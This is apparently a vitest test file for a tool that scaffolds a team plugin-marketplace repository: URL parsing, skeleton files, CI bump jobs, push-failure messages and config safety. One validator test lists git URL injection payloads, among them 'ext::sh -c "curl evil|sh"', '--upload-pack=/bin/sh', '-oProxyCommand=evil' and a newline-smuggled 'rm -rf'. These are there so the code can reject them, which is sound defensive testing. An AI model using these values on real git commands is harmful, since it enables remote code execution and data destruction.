import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  assertSafeGitUrl,
  clearTeamConfig,
  formatInitSuccess,
  formatLeaveSuccess,
  teamSkillsDir,
  hostFromUrl,
  initTeamRepo,
  loadTeamConfig,
  nonInteractiveEnv,
  repoNameFromUrl,
  saveTeamConfig,
  skeletonFiles,
  writeSkeleton,
  pushFailureReason,
  summarizeGitStderr,
} from "./init.js";

describe("nonInteractiveEnv", () => {
  it("given a shell that would prompt, when a forge or git call is built, then every prompt is disabled", () => {
    const env = nonInteractiveEnv({ PATH: "/usr/bin" });

    expect(env).toMatchObject({
      GIT_TERMINAL_PROMPT: "0",
      GLAB_NO_PROMPT: "1",
      GH_PROMPT_DISABLED: "1",
      NO_COLOR: "1",
    });
  });

  it("given the caller's environment, when it is extended, then PATH and the rest survive", () => {
    const env = nonInteractiveEnv({ PATH: "/usr/bin", HOME: "/home/dev" });

    expect(env.PATH).toBe("/usr/bin");
    expect(env.HOME).toBe("/home/dev");
  });
});

describe("teamSkillsDir", () => {
  it("is null without a team config and resolves under the marketplaces root with one", () => {
    expect(teamSkillsDir(home, "/plugins/marketplaces")).toBeNull();
    saveTeamConfig({ repoUrl: "git@x:t/skills.git", marketplaceName: "acme-skills" }, home);
    expect(teamSkillsDir(home, "/plugins/marketplaces")).toBe("/plugins/marketplaces/acme-skills/skills");
  });
});

describe("assertSafeGitUrl", () => {
  it("accepts real transports and local paths", () => {
    for (const url of [
      "https://gitlab.example.com/team/skills.git",
      "git@gitlab.example.com:team/skills.git",
      "ssh://git@host/team/skills.git",
      "/var/repos/skills",
      "file:///var/repos/skills",
      "./local-repo",
    ]) {
      expect(() => assertSafeGitUrl(url)).not.toThrow();
    }
  });

  it("rejects remote-helper and option-injection URLs", () => {
    for (const url of [
      'ext::sh -c "curl evil|sh"',
      "fd::17/foo",
      "--upload-pack=/bin/sh",
      "-oProxyCommand=evil",
      "https://host/repo\nrm -rf",
      "",
    ]) {
      expect(() => assertSafeGitUrl(url)).toThrow();
    }
  });
});

let home: string;

beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), "handbook-test-"));
});

afterEach(() => {
  rmSync(home, { recursive: true, force: true });
});

describe("hostFromUrl / repoNameFromUrl", () => {
  it("parses ssh and https git URLs", () => {
    expect(hostFromUrl("git@gitlab.acme.com:team/skills.git")).toBe("gitlab.acme.com");
    expect(hostFromUrl("https://GitHub.com/acme/skills.git")).toBe("github.com");
    expect(repoNameFromUrl("git@gitlab.acme.com:team/skills.git")).toBe("skills");
    expect(repoNameFromUrl("https://github.com/acme/team-skills")).toBe("team-skills");
  });

  it("returns null for unparseable URLs", () => {
    expect(hostFromUrl("")).toBeNull();
    expect(repoNameFromUrl("nonsense")).toBeNull();
  });
});

describe("skeletonFiles", () => {
  it("emits marketplace, plugin, readme, bump script, and skills placeholder", () => {
    const files = skeletonFiles("acme-skills", "git@gitlab.acme.com:team/skills.git", "gitlab.acme.com", "", true);
    const marketplace = JSON.parse(files[".claude-plugin/marketplace.json"]!);
    expect(marketplace.name).toBe("acme-skills");
    expect(marketplace.plugins[0]).toMatchObject({ name: "acme-skills", source: "./" });
    const plugin = JSON.parse(files[".claude-plugin/plugin.json"]!);
    expect(plugin).toMatchObject({ name: "acme-skills", version: "0.1.0" });
    expect(files["README.md"]).toContain("/handbook:join git@gitlab.acme.com:team/skills.git");
    expect(files["scripts/bump-version.mjs"]).toContain("plugin.version");
    expect(files["skills/README.md"]).toBeDefined();
    // consumer notice hook ships inside the team plugin (no TeamHandbook engine needed)
    expect(JSON.parse(files["hooks/hooks.json"]!).hooks.SessionStart).toBeDefined();
    expect(files["hooks/notice.mjs"]).toContain("new skill(s) since your last session");
  });

  it("guards the GitLab CI job on the token so it skips instead of failing", () => {
    const gitlab = skeletonFiles("s", "git@gitlab.acme.com:a/s.git", "gitlab.acme.com", "", true);
    expect(gitlab[".gitlab-ci.yml"]).toContain("$TEAMHANDBOOK_CI_TOKEN");
  });

  it("tells the reader how updates reach them, without depending on CI to make it true", () => {
    const readme = skeletonFiles("s", "git@gitlab.acme.com:a/s.git", "gitlab.acme.com")["README.md"]!;

    expect(readme).toContain("raises the version in");
    expect(readme).toContain("Nothing here needs CI, an access token");
    expect(readme).toContain("--with-ci");
  });

  it("discloses the consumer hook's local state write in the generated README", () => {
    expect(skeletonFiles("s", "git@github.com:a/s.git", "github.com", "", true)["README.md"]).toContain(
      "~/.teamhandbook-consumer",
    );
  });

  it("picks GitHub Actions for github hosts and GitLab CI otherwise", () => {
    const github = skeletonFiles("s", "git@github.com:a/s.git", "github.com", "", true);
    expect(github[".github/workflows/version-bump.yml"]).toBeDefined();
    expect(github[".gitlab-ci.yml"]).toBeUndefined();
    const gitlab = skeletonFiles("s", "git@gitlab.acme.com:a/s.git", "gitlab.acme.com", "", true);
    expect(gitlab[".gitlab-ci.yml"]).toBeDefined();
    expect(gitlab[".github/workflows/version-bump.yml"]).toBeUndefined();
    const unknown = skeletonFiles("s", "git@code.acme.com:a/s.git", "code.acme.com", "", true);
    expect(unknown[".gitlab-ci.yml"]).toBeDefined();
  });

  it("produces a notice that announces a merged MCP server, not just skills", () => {
    const dir = mkdtempSync(join(tmpdir(), "handbook-skeleton-"));
    const consumerHome = mkdtempSync(join(tmpdir(), "handbook-consumer-"));
    const run = (): string =>
      execFileSync("node", ["hooks/notice.mjs"], {
        cwd: dir,
        encoding: "utf8",
        env: { ...process.env, HOME: consumerHome, USERPROFILE: consumerHome },
      });
    try {
      writeSkeleton(dir, skeletonFiles("acme", "git@github.com:a/s.git", "github.com"));
      mkdirSync(join(dir, "skills", "fix-npm-test"), { recursive: true });
      // first run only records what is already there
      expect(run()).toBe("");

      writeFileSync(
        join(dir, ".mcp.json"),
        JSON.stringify({ mcpServers: { gitlab: { type: "http", url: "https://gitlab.com/api/v4/mcp" } } }),
      );
      mkdirSync(join(dir, "skills", "fix-eslint"), { recursive: true });
      const notice = run();

      expect(notice).toContain("1 new skill(s) and 1 new MCP server(s) since your last session");
      expect(notice).toContain("fix-eslint");
      expect(notice).toContain("gitlab (MCP)");
      // and it does not repeat itself the next time
      expect(run()).toBe("");
    } finally {
      rmSync(dir, { recursive: true, force: true });
      rmSync(consumerHome, { recursive: true, force: true });
    }
  });

  it("reads a bare server map too, which is the other shape plugins declare in the field", () => {
    const dir = mkdtempSync(join(tmpdir(), "handbook-skeleton-"));
    const consumerHome = mkdtempSync(join(tmpdir(), "handbook-consumer-"));
    const run = (): string =>
      execFileSync("node", ["hooks/notice.mjs"], {
        cwd: dir,
        encoding: "utf8",
        env: { ...process.env, HOME: consumerHome, USERPROFILE: consumerHome },
      });
    try {
      writeSkeleton(dir, skeletonFiles("acme", "git@github.com:a/s.git", "github.com"));
      expect(run()).toBe("");
      writeFileSync(join(dir, ".mcp.json"), JSON.stringify({ terraform: { command: "terraform-mcp" } }));

      expect(run()).toContain("1 new MCP server(s) since your last session: terraform (MCP)");
    } finally {
      rmSync(dir, { recursive: true, force: true });
      rmSync(consumerHome, { recursive: true, force: true });
    }
  });

  it("produces a bump script that actually increments the patch version", () => {
    const dir = mkdtempSync(join(tmpdir(), "handbook-skeleton-"));
    try {
      writeSkeleton(dir, skeletonFiles("s", "git@github.com:a/s.git", "github.com", "", true));
      execFileSync("node", ["scripts/bump-version.mjs"], { cwd: dir });
      const plugin = JSON.parse(readFileSync(join(dir, ".claude-plugin/plugin.json"), "utf8"));
      expect(plugin.version).toBe("0.1.1");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("team config", () => {
  it("saves the team section without clobbering other config keys", () => {
    writeFileSync(join(home, "config.json"), JSON.stringify({ gate: { model: "haiku" } }));
    saveTeamConfig({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" }, home);
    const config = JSON.parse(readFileSync(join(home, "config.json"), "utf8"));
    expect(config.gate).toEqual({ model: "haiku" });
    expect(loadTeamConfig(home)).toMatchObject({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" });
  });

  it("returns null when no team is configured", () => {
    expect(loadTeamConfig(home)).toBeNull();
  });

  it("clearTeamConfig drops the binding, returns the previous url, and keeps other keys", () => {
    writeFileSync(join(home, "config.json"), JSON.stringify({ gate: { model: "haiku" } }));
    saveTeamConfig({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" }, home);
    expect(clearTeamConfig(home)).toBe("git@x.com:a/b.git");
    expect(loadTeamConfig(home)).toBeNull();
    expect(JSON.parse(readFileSync(join(home, "config.json"), "utf8")).gate).toEqual({ model: "haiku" });
    expect(clearTeamConfig(home)).toBeNull(); // idempotent once already gone
  });
});

describe("pushFailureReason", () => {
  const url = "git@gitlab.com:acme/handbook.git";

  it("given a protected branch, when reported, then it names the role, not the command", () => {
    const reason = pushFailureReason(url, "master", new Error("remote: You are not allowed to push code to protected branches on this project.\n! [remote rejected] master -> master (pre-receive hook declined)"));

    // the forge's own sentence survives rather than being replaced by our guess
    expect(reason).toContain("not allowed to push code to protected branches");
    expect(reason).toContain("Ask for the role");
  });

  it("given the remote moved underneath, when reported, then it says nothing was changed", () => {
    const reason = pushFailureReason(url, "main", new Error("! [rejected] main -> main (non-fast-forward)"));

    expect(reason).toContain("nothing was changed");
  });
});

describe("summarizeGitStderr", () => {
  // verbatim shape of a real GitLab push rejection: the reason arrives on a `remote:`
  // line and git adds THREE lines of verdict after it, so the reason is exactly what a
  // tail-of-three cut away. A customer hit this and had to re-clone the repo by hand to
  // find out which rule had fired.
  const rejection = [
    "remote: GitLab: Branch name 'handbook/gateway-camelcase' does not follow the pattern '((^HQA-\\d+(-[a-z0-9]+)*)|dev|master)$'",
    "To gitlab.com:acme/qa-handbook.git",
    " ! [remote rejected] handbook/gateway-camelcase -> handbook/gateway-camelcase (pre-receive hook declined)",
    "error: failed to push some refs to 'gitlab.com:acme/qa-handbook.git'",
  ].join("\n");

  it("given a rejection whose reason sits above the tail, when summarized, then the reason survives", () => {
    const summary = summarizeGitStderr(rejection);

    expect(summary).toContain("does not follow the pattern");
    expect(summary).toContain("pre-receive hook declined");
  });

  it("given a summarized rejection, when classified, then the rule is named rather than guessed at", () => {
    const reason = pushFailureReason(
      "git@gitlab.com:acme/qa-handbook.git",
      "handbook/gateway-camelcase",
      new Error(`git push failed: ${summarizeGitStderr(rejection)}`),
    );

    expect(reason).toContain("rejected the branch NAME");
    expect(reason).toContain("HQA");
  });

  it("given stderr with no remote explanation, when summarized, then the tail is still reported", () => {
    const summary = summarizeGitStderr("fatal: could not read Username for 'https://gitlab.com'");

    expect(summary).toContain("could not read Username");
  });

  it("given a reason that also appears in the tail, when summarized, then it is not repeated", () => {
    const summary = summarizeGitStderr("remote: GitLab: nope\nTo gitlab.com:acme/x.git");

    expect(summary.match(/remote: GitLab: nope/g)).toHaveLength(1);
  });
});

describe("pushFailureReason — a branch name the forge forbids", () => {
  // verbatim from a real GitLab group: the branch NAME was the problem, and the
  // previous message blamed protection and told the user to ask for Maintainer
  const gitlab = new Error(
    "remote: GitLab: Branch name 'handbook/scaffold' does not follow the pattern '((^(TEAM|OPS|ENG|SEC)-\\d+(-[a-z0-9]+)*)|dev|master|prod|hotfix(.*))$'\n ! [remote rejected] HEAD -> handbook/scaffold (pre-receive hook declined)",
  );

  it("quotes the pattern and says access is not the problem", () => {
    const reason = pushFailureReason("git@gitlab.com:acme/handbook.git", "handbook/scaffold", gitlab);

    expect(reason).toContain("rejected the branch NAME");
    expect(reason).toContain("TEAM|OPS|ENG|SEC");
    expect(reason).toContain("Nothing is wrong with your access");
    expect(reason).toContain("--branch-prefix");
    expect(reason).not.toContain("Maintainer");
  });

  it("keeps the remote's own words when a hook declines for some other reason", () => {
    const reason = pushFailureReason(
      "git@gitlab.com:acme/handbook.git",
      "handbook/scaffold",
      new Error("remote: GitLab: Commit message does not follow the pattern\n ! [remote rejected] HEAD -> x (pre-receive hook declined)"),
    );

    expect(reason).toContain("Commit message does not follow the pattern");
  });
});

describe("pushFailureReason — the other rules a forge enforces", () => {
  const url = "git@gitlab.com:acme/handbook.git";

  it("given the commit message is refused, when reported, then it points at the commit prefix", () => {
    const reason = pushFailureReason(url, "handbook/scaffold", new Error(
      "remote: GitLab: Commit message does not follow the pattern '^(TEAM)-\\d+'\n ! [remote rejected] HEAD -> x (pre-receive hook declined)",
    ));

    expect(reason).toContain("rejected the commit MESSAGE");
    expect(reason).toContain("--commit-prefix");
  });

  it("given the commit author is refused, when reported, then it points at the developer's git config", () => {
    const reason = pushFailureReason(url, "handbook/scaffold", new Error(
      "remote: GitLab: Author 'TeamHandbook@localhost' is not a GitLab user\n ! [remote rejected] HEAD -> x (pre-receive hook declined)",
    ));

    expect(reason).toContain("rejected the commit AUTHOR");
    expect(reason).toContain("git config user.name/user.email");
  });

  it("given a rule nobody anticipated, when reported, then the forge's own words are kept", () => {
    const reason = pushFailureReason(url, "handbook/scaffold", new Error(
      "remote: GitLab: Your push was rejected by a rule we have never seen\n ! [remote rejected] HEAD -> x (pre-receive hook declined)",
    ));

    expect(reason).toContain("Your push was rejected by a rule we have never seen");
  });
});

describe("skeletonFiles — CI is no longer part of the default scaffold", () => {
  it("given a plain init, when scaffolded, then the bump script is not shipped either", () => {
    const files = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com");

    // nothing in the default scaffold would ever run it
    expect(files["scripts/bump-version.mjs"]).toBeUndefined();
  });

  it("given the CI is asked for, when scaffolded, then the script it runs comes with it", () => {
    const files = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com", "", true);

    expect(files["scripts/bump-version.mjs"]).toBeDefined();
  });

  it("given a plain init, when scaffolded, then no CI file is produced", () => {
    const gitlab = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com");
    const github = skeletonFiles("acme", "https://github.com/acme/handbook", "github.com");

    // the bump rides in the skill's own request now, so nothing here needs a token or
    // the right to push to a protected branch
    expect(gitlab[".gitlab-ci.yml"]).toBeUndefined();
    expect(github[".github/workflows/version-bump.yml"]).toBeUndefined();
  });

  it("given the CI is asked for, when scaffolded, then the right one for the host appears", () => {
    const gitlab = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com", "", true);
    const github = skeletonFiles("acme", "https://github.com/acme/handbook", "github.com", "", true);

    expect(gitlab[".gitlab-ci.yml"]).toBeDefined();
    expect(gitlab[".github/workflows/version-bump.yml"]).toBeUndefined();
    expect(github[".github/workflows/version-bump.yml"]).toBeDefined();
  });
});

describe("skeletonFiles — the CI has to survive the same rules the developer does", () => {
  it("given a commit prefix, when scaffolded, then the version-bump job uses it too", () => {
    const files = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com", "TEAM-1 ", true);

    const ci = files[".gitlab-ci.yml"]!;
    // the bump commit is made on the server and faces the same message rule
    expect(ci).toContain('git commit -am "TEAM-1 ci: bump plugin version"');
    // and the guard that stops it looping has to match the prefixed message
    expect(ci).toContain("$CI_COMMIT_MESSAGE !~ /^TEAM-1 ci: bump plugin version/");
  });

  it("given no prefix, when scaffolded, then nothing changes for teams without such rules", () => {
    const files = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com", "", true);

    expect(files[".gitlab-ci.yml"]).toContain('git commit -am "ci: bump plugin version"');
  });

  it("given a GitHub repo, when scaffolded, then its workflow carries the prefix as well", () => {
    const files = skeletonFiles("acme", "https://github.com/acme/handbook", "github.com", "TEAM-1 ", true);

    expect(files[".github/workflows/version-bump.yml"]).toContain('git commit -am "TEAM-1 ci: bump plugin version"');
  });
});

describe("initTeamRepo", () => {
  function bareRepo(): string {
    const dir = mkdtempSync(join(tmpdir(), "handbook-team-"));
    execFileSync("git", ["init", "--bare", "-b", "main", dir]);
    return dir;
  }

  it("scaffolds, pushes to an empty repo, and records the team config", () => {
    const remote = bareRepo();
    try {
      const result = initTeamRepo(remote, "acme-skills", home, undefined, "2026-08-08T02:00:00Z");
      expect(result).toMatchObject({ ok: true, name: "acme-skills", url: remote });
      const files = execFileSync("git", ["-C", remote, "ls-tree", "-r", "--name-only", "main"], {
        encoding: "utf8",
      });
      expect(files).toContain(".claude-plugin/marketplace.json");
      expect(files).toContain(".claude-plugin/plugin.json");
      expect(loadTeamConfig(home)).toEqual({
        repoUrl: remote,
        marketplaceName: "acme-skills",
        initializedAt: "2026-08-08T02:00:00Z",
      });
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("derives the marketplace name from the repo URL when none is given", () => {
    // the injected runner stands in for git, so it has to answer the one question the
    // flow asks it: which branch does this remote call default
    const result = initTeamRepo("git@gitlab.acme.com:team/Payments-Skills.git", undefined, home, (args) => {
      // the stub stands in for git, so it answers the two things the flow asks it:
      // whose commit this is, and what the remote calls its default branch
      if (args[0] === "config") return args[1] === "user.name" ? "Dev" : "dev@acme.com";
      if (args[0] === "symbolic-ref") return "main";
      return "";
    });
    expect(result).toMatchObject({ ok: true, name: "payments-skills" });
  });

  /** A repository as an organisation's tooling actually hands it over: one commit, a
   * README with something in it, and a default branch that is not called main. */
  function seededRepo(branch: string, files: Record<string, string> = { "README.md": "# our repo\n" }): string {
    const remote = mkdtempSync(join(tmpdir(), "handbook-team-"));
    execFileSync("git", ["init", "--bare", "-b", branch, remote]);
    const seed = mkdtempSync(join(tmpdir(), "handbook-seed-"));
    try {
      execFileSync("git", ["-C", seed, "init", "-b", branch]);
      for (const [path, body] of Object.entries(files)) {
        mkdirSync(dirname(join(seed, path)), { recursive: true });
        writeFileSync(join(seed, path), body);
      }
      execFileSync("git", ["-C", seed, "add", "-A"]);
      execFileSync("git", ["-C", seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-m", "seed"]);
      execFileSync("git", ["-C", seed, "push", remote, branch]);
    } finally {
      rmSync(seed, { recursive: true, force: true });
    }
    return remote;
  }

  // no gh/glab on a test machine: the branch is pushed and the link is manual
  const noForge = () => {
    const err = new Error("spawn gh ENOENT") as Error & { code: string };
    err.code = "ENOENT";
    throw err;
  };

  it("given a repo with a README on master, when initialized, then the scaffold waits in a request and master is untouched", () => {
    const remote = seededRepo("master");
    try {
      const result = initTeamRepo(remote, "acme-skills", home, undefined, undefined, noForge);

      expect(result).toMatchObject({ ok: true, branch: "handbook/scaffold", defaultBranch: "master", merged: false });
      expect(result.skipped).toContain("README.md");
      // pushing to a protected default branch is what most members cannot do; the
      // scaffold branch is what they can
      const onDefault = execFileSync("git", ["-C", remote, "ls-tree", "-r", "--name-only", "master"], { encoding: "utf8" });
      expect(onDefault).not.toContain(".claude-plugin/marketplace.json");
      const onBranch = execFileSync("git", ["-C", remote, "ls-tree", "-r", "--name-only", "handbook/scaffold"], { encoding: "utf8" });
      expect(onBranch).toContain(".claude-plugin/marketplace.json");
      const readme = execFileSync("git", ["-C", remote, "show", "master:README.md"], { encoding: "utf8" });
      expect(readme).toBe("# our repo\n");
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("given no forge CLI, when initialized, then it hands back a link to open the request by hand", () => {
    const remote = seededRepo("master");
    try {
      const result = initTeamRepo(remote, "acme-skills", home, undefined, undefined, noForge);

      expect(result.prUrl).toBeUndefined();
      expect(result.prError).toContain("not installed");
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("given an empty repository, when initialized, then the scaffold goes straight to the default branch", () => {
    const remote = mkdtempSync(join(tmpdir(), "handbook-team-"));
    execFileSync("git", ["init", "--bare", "-b", "master", remote]);
    try {
      const result = initTeamRepo(remote, "acme-skills", home, undefined, undefined, noForge);

      // nothing to open a request against yet, so this is the one case that must push direct
      expect(result).toMatchObject({ ok: true, branch: "master", merged: true });
      const files = execFileSync("git", ["-C", remote, "ls-tree", "-r", "--name-only", "master"], { encoding: "utf8" });
      expect(files).toContain(".claude-plugin/marketplace.json");
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("given a placeholder README with nothing in it, when initialized, then the handbook README fills it", () => {
    const remote = seededRepo("master", { "README.md": "\n" });
    try {
      initTeamRepo(remote, "acme-skills", home, undefined, undefined, noForge);

      const readme = execFileSync("git", ["-C", remote, "show", "handbook/scaffold:README.md"], { encoding: "utf8" });
      expect(readme).toContain("Your team's shared setup");
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("given a repo that is already a handbook, when initialized, then it says to join instead", () => {
    const remote = seededRepo("main", { ".claude-plugin/marketplace.json": '{"name":"acme"}\n' });
    try {
      const result = initTeamRepo(remote, "acme-skills", home);

      expect(result.ok).toBe(false);
      expect(result.error).toContain("/handbook:join");
      expect(loadTeamConfig(home)).toBeNull();
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  function capturingForge(): { forge: (tool: string, args: string[], cwd: string) => string; body: () => string } {
    let captured = "";
    const forge = (tool: string, args: string[], cwd: string): string => {
      const flag = tool === "gh" ? "--body" : "--description";
      const idx = args.indexOf(flag);
      captured = idx >= 0 ? args[idx + 1]! : "";
      return "https://gitlab.acme.com/team/handbook/-/merge_requests/1";
    };
    return { forge, body: () => captured };
  }

  it("given --with-ci, when the request is opened, then the pushed summary and PR body both mention the CI file", () => {
    const remote = seededRepo("master");
    try {
      const { forge, body } = capturingForge();
      const result = initTeamRepo(remote, "acme-skills", home, undefined, undefined, forge, undefined, "", true);

      expect(result.withCi).toBe(true);
      expect(body()).toContain("the version-bump CI");
      expect(formatInitSuccess(result)).toContain("marketplace skeleton + version-bump CI to branch");
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("given no --with-ci (the default), when the request is opened, then neither the pushed summary nor the PR body claims a CI file that was never written", () => {
    const remote = seededRepo("master");
    try {
      const { forge, body } = capturingForge();
      const result = initTeamRepo(remote, "acme-skills", home, undefined, undefined, forge);

      expect(result.withCi).toBeFalsy();
      expect(body()).not.toContain("CI");
      const files = execFileSync("git", ["-C", remote, "ls-tree", "-r", "--name-only", "handbook/scaffold"], {
        encoding: "utf8",
      });
      expect(files).not.toContain(".gitlab-ci.yml");
      const summary = formatInitSuccess(result);
      expect(summary).toContain("marketplace skeleton to branch");
      expect(summary).not.toContain("CI");
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("given --with-ci on an empty repo (direct push), then the merged summary mentions the CI file", () => {
    const remote = mkdtempSync(join(tmpdir(), "handbook-team-"));
    execFileSync("git", ["init", "--bare", "-b", "master", remote]);
    try {
      const result = initTeamRepo(remote, "acme-skills", home, undefined, undefined, noForge, undefined, "", true);

      expect(result).toMatchObject({ ok: true, merged: true, withCi: true });
      expect(formatInitSuccess(result)).toContain("marketplace skeleton + version-bump CI, straight to");
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("refuses empty URLs, underivable names, and re-initialization", () => {
    expect(initTeamRepo("  ", undefined, home)).toMatchObject({ ok: false });
    expect(initTeamRepo("nonsense", undefined, home, () => {})).toMatchObject({
      ok: false,
      error: expect.stringContaining("--name"),
    });
    saveTeamConfig({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" }, home);
    expect(initTeamRepo("git@x.com:a/c.git", undefined, home, () => {})).toMatchObject({
      ok: false,
      error: expect.stringContaining("already configured"),
    });
    expect(existsSync(join(home, "sessions"))).toBe(false);
  });
});

describe("formatInitSuccess", () => {
  it("prints the join command and the consumer-only alternative", () => {
    const text = formatInitSuccess({ ok: true, name: "acme-skills", url: "git@x.com:a/b.git", home });
    expect(text).toContain("/handbook:join git@x.com:a/b.git");
    expect(text).toContain("/plugin marketplace add git@x.com:a/b.git");
    expect(text).toContain("/plugin install acme-skills");
  });
});

describe("formatLeaveSuccess", () => {
  const team = { repoUrl: "git@x.com:a/b.git", marketplaceName: "acme-skills" };

  it("given team-scoped candidates left in the queue, when the team binding is cleared, then the message sends the user to an explicit --to", () => {
    const text = formatLeaveSuccess(team);

    expect(text).toContain("--to personal");
    expect(text).toContain("--to project");
    expect(text).toMatch(/marked for the team/i);
  });

  it("given an approval that is still ahead, when the message describes where a project skill lands, then it names the capturing project rather than the current one", () => {
    const text = formatLeaveSuccess(team);

    expect(text).toMatch(/captured in/i);
    expect(text).not.toMatch(/install into the current project/i);
  });

  it("given the parts of the old message that were true, when it is reformatted, then the join command and the separate marketplace subscription survive", () => {
    const text = formatLeaveSuccess(team);

    expect(text).toContain("git@x.com:a/b.git");
    expect(text).toContain("/handbook:join");
    expect(text).toContain("/plugin marketplace remove acme-skills");
  });
});

describe("a broken config.json is never overwritten (it holds the privacy switches)", () => {
  it("refuses to save or clear the team binding rather than erase the user's opt-out", () => {
    const optOut = '{"harvest":{"enabled":false},"gate":{"auto":false},}'; // trailing comma
    writeFileSync(join(home, "config.json"), optOut);
    expect(() => saveTeamConfig({ repoUrl: "git@x:t/s.git", marketplaceName: "t" }, home)).toThrow(
      /not valid JSON/,
    );
    expect(() => clearTeamConfig(home)).toThrow(/not valid JSON/);
    // the bytes that carry the opt-out are still there
    expect(readFileSync(join(home, "config.json"), "utf8")).toBe(optOut);
  });

  it("initTeamRepo refuses instead of silently rewriting the file", () => {
    writeFileSync(join(home, "config.json"), '{"harvest":{"enabled":false},}');
    const result = initTeamRepo("git@x.com:a/b.git", "b", home, () => {});
    expect(result.ok).toBe(false);
    expect(result.error).toContain("not valid JSON");
  });
});
